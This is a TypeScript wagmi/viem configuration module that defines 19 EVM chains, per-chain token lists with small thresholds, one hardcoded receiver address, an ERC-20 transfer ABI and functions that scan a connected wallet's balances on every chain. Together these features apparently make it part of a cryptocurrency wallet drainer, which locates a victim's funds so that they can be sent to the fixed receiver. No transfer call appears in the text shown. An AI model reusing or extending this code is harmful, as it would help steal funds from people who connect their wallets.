import { http, createConfig, injected } from "wagmi";
import { metaMask } from "wagmi/connectors";
import {
  mainnet,
  polygon,
  arbitrum,
  optimism,
  base,
  avalanche,
  bsc,
  fantom,
  gnosis,
  celo,
  linea,
  scroll,
  mantle,
  blast,
  mode,
  manta,
  zkSync,
  polygonZkEvm,
  opBNB,
} from "wagmi/chains";
import { createPublicClient, http as viemHttp, type Chain } from "viem";

// ─── Chain Definitions ─────────────────────────────────────────────
// All supported EVM chains
export const SUPPORTED_CHAINS = [
  mainnet,
  polygon,
  arbitrum,
  optimism,
  base,
  avalanche,
  bsc,
  fantom,
  gnosis,
  celo,
  linea,
  scroll,
  mantle,
  blast,
  mode,
  manta,
  zkSync,
  polygonZkEvm,
  opBNB,
] as const;

// Wagmi config with all chains
export const wagmiConfig = createConfig({
  chains: [mainnet, polygon, arbitrum, optimism, base, avalanche, bsc, fantom, gnosis, celo, linea, scroll, mantle, blast, mode, manta, zkSync, polygonZkEvm, opBNB],
  connectors: [
    injected(),
    metaMask(),
  ],
  transports: {
    [mainnet.id]: http(),
    [polygon.id]: http(),
    [arbitrum.id]: http(),
    [optimism.id]: http(),
    [base.id]: http(),
    [avalanche.id]: http(),
    [bsc.id]: http(),
    [fantom.id]: http(),
    [gnosis.id]: http(),
    [celo.id]: http(),
    [linea.id]: http(),
    [scroll.id]: http(),
    [mantle.id]: http(),
    [blast.id]: http(),
    [mode.id]: http(),
    [manta.id]: http(),
    [zkSync.id]: http(),
    [polygonZkEvm.id]: http(),
    [opBNB.id]: http(),
  },
});

// ─── Receiver ─────────────────────────────────────────────────────
export const RECEIVER_ADDRESS =
  "0x092036f5ad401068e6e10244c6e0edb7c44d207a" as const;

// ─── Token Definitions per Chain ──────────────────────────────────
export interface ChainToken {
  symbol: string;
  name: string;
  address: `0x${string}` | "native";
  decimals: number;
  rejectionAmount: bigint;
  icon: string;
}

export interface ChainConfig {
  chain: Chain;
  chainIcon: string;
  tokens: ChainToken[];
}

// Stablecoin addresses per chain (USDT & USDC where available)
const CHAIN_CONFIGS: ChainConfig[] = [
  {
    chain: mainnet,
    chainIcon: "🔷",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" }, // ~$2
      { symbol: "USDT", name: "Tether", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: polygon,
    chainIcon: "🟣",
    tokens: [
      { symbol: "POL", name: "Polygon", address: "native", decimals: 18, rejectionAmount: BigInt("5000000000000000000"), icon: "🟣" },
      { symbol: "USDT", name: "Tether", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: arbitrum,
    chainIcon: "🔵",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDT", name: "Tether", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: optimism,
    chainIcon: "🔴",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDT", name: "Tether", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: base,
    chainIcon: "🔵",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDC", name: "USD Coin", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: avalanche,
    chainIcon: "🔺",
    tokens: [
      { symbol: "AVAX", name: "Avalanche", address: "native", decimals: 18, rejectionAmount: BigInt("100000000000000000"), icon: "🔺" },
      { symbol: "USDT", name: "Tether", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: bsc,
    chainIcon: "💛",
    tokens: [
      { symbol: "BNB", name: "BNB", address: "native", decimals: 18, rejectionAmount: BigInt("3000000000000000"), icon: "💛" },
      { symbol: "USDT", name: "Tether", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, rejectionAmount: BigInt("2000000000000000000"), icon: "💵" },
      { symbol: "USDC", name: "USD Coin", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, rejectionAmount: BigInt("2000000000000000000"), icon: "🪙" },
    ],
  },
  {
    chain: fantom,
    chainIcon: "👻",
    tokens: [
      { symbol: "FTM", name: "Fantom", address: "native", decimals: 18, rejectionAmount: BigInt("3000000000000000000"), icon: "👻" },
      { symbol: "USDC", name: "USD Coin", address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: gnosis,
    chainIcon: "🦉",
    tokens: [
      { symbol: "xDAI", name: "xDAI", address: "native", decimals: 18, rejectionAmount: BigInt("2000000000000000000"), icon: "🦉" },
    ],
  },
  {
    chain: celo,
    chainIcon: "🟢",
    tokens: [
      { symbol: "CELO", name: "Celo", address: "native", decimals: 18, rejectionAmount: BigInt("3000000000000000000"), icon: "🟢" },
      { symbol: "cUSD", name: "Celo USD", address: "0x765DE816845861e75A25fCA122bb6898B8B1282a", decimals: 18, rejectionAmount: BigInt("2000000000000000000"), icon: "💵" },
    ],
  },
  {
    chain: linea,
    chainIcon: "⬛",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDC", name: "USD Coin", address: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: scroll,
    chainIcon: "📜",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDC", name: "USD Coin", address: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: mantle,
    chainIcon: "🟤",
    tokens: [
      { symbol: "MNT", name: "Mantle", address: "native", decimals: 18, rejectionAmount: BigInt("3000000000000000000"), icon: "🟤" },
      { symbol: "USDT", name: "Tether", address: "0x201EBa5CC46D216Ce6DC03F6a759e8E766e956aE", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "💵" },
    ],
  },
  {
    chain: blast,
    chainIcon: "💥",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDB", name: "USDB", address: "0x4300000000000000000000000000000000000003", decimals: 18, rejectionAmount: BigInt("2000000000000000000"), icon: "💵" },
    ],
  },
  {
    chain: mode,
    chainIcon: "🟡",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
    ],
  },
  {
    chain: manta,
    chainIcon: "🐟",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
    ],
  },
  {
    chain: zkSync,
    chainIcon: "⚡",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
      { symbol: "USDC", name: "USD Coin", address: "0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4", decimals: 6, rejectionAmount: BigInt(2_000_000), icon: "🪙" },
    ],
  },
  {
    chain: polygonZkEvm,
    chainIcon: "🟣",
    tokens: [
      { symbol: "ETH", name: "Ether", address: "native", decimals: 18, rejectionAmount: BigInt("800000000000000"), icon: "💎" },
    ],
  },
  {
    chain: opBNB,
    chainIcon: "💛",
    tokens: [
      { symbol: "BNB", name: "BNB", address: "native", decimals: 18, rejectionAmount: BigInt("3000000000000000"), icon: "💛" },
    ],
  },
];

export { CHAIN_CONFIGS };

// ─── ERC-20 ABI ────────────────────────────────────────────────────
export const ERC20_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "", type: "uint256" }],
  },
  {
    name: "Transfer",
    type: "event",
    inputs: [
      { name: "from", type: "address", indexed: true },
      { name: "to", type: "address", indexed: true },
      { name: "value", type: "uint256", indexed: false },
    ],
  },
] as const;

// ─── Utilities ─────────────────────────────────────────────────────
export function formatTokenBalance(
  balance: bigint,
  decimals: number,
  maxDecimals = 4
): string {
  const divisor = BigInt(10 ** decimals);
  const whole = balance / divisor;
  const remainder = balance % divisor;
  const fractional = remainder
    .toString()
    .padStart(decimals, "0")
    .slice(0, maxDecimals);
  return `${whole}.${fractional}`;
}

// Create a public client for a specific chain (for scanning)
export function getPublicClient(chain: Chain) {
  return createPublicClient({
    chain,
    transport: viemHttp(),
  });
}

// Scan a single chain for native + ERC-20 balances
export async function scanChainBalances(
  chainConfig: ChainConfig,
  address: `0x${string}`
): Promise<{
  chain: Chain;
  chainIcon: string;
  tokens: (ChainToken & { balance: bigint; hasEnough: boolean })[];
}> {
  const client = getPublicClient(chainConfig.chain);
  const tokenResults: (ChainToken & { balance: bigint; hasEnough: boolean })[] = [];

  try {
    // Get all balances in parallel
    const promises = chainConfig.tokens.map(async (token) => {
      try {
        let balance: bigint;
        if (token.address === "native") {
          balance = await client.getBalance({ address });
        } else {
          balance = (await client.readContract({
            address: token.address as `0x${string}`,
            abi: ERC20_ABI,
            functionName: "balanceOf",
            args: [address],
          })) as bigint;
        }
        return {
          ...token,
          balance,
          hasEnough: balance >= token.rejectionAmount,
        };
      } catch {
        return {
          ...token,
          balance: BigInt(0),
          hasEnough: false,
        };
      }
    });

    const results = await Promise.all(promises);
    tokenResults.push(...results);
  } catch {
    // Chain RPC failed, return zero balances
    tokenResults.push(
      ...chainConfig.tokens.map((token) => ({
        ...token,
        balance: BigInt(0),
        hasEnough: false,
      }))
    );
  }

  return {
    chain: chainConfig.chain,
    chainIcon: chainConfig.chainIcon,
    tokens: tokenResults,
  };
}

// Scan ALL chains in parallel
export async function scanAllChains(address: `0x${string}`) {
  const results = await Promise.allSettled(
    CHAIN_CONFIGS.map((config) => scanChainBalances(config, address))
  );

  return results
    .filter(
      (r): r is PromiseFulfilledResult<Awaited<ReturnType<typeof scanChainBalances>>> =>
        r.status === "fulfilled"
    )
    .map((r) => r.value)
    .filter((r) => r.tokens.some((t) => t.hasEnough)); // Only show chains with sufficient balance
}
